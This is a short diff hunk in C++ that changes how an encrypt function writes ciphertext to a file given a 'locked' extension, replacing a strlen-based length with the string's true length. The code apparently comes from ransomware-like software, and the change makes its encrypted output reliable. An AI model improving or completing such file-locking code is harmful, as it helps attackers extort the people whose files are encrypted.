@@ -78,7 +78,7 @@ void encrypt(const crypt_data* d, string path) {
 #endif
 
 	std::ofstream ofile((path + LOCKED_EXTENSION).c_str(), std::ios::binary);
-	ofile.write(cipher.c_str(), strlen(cipher.c_str()));
+	ofile.write(cipher.c_str(), cipher.length());
 	ofile.close();
 
 	/*
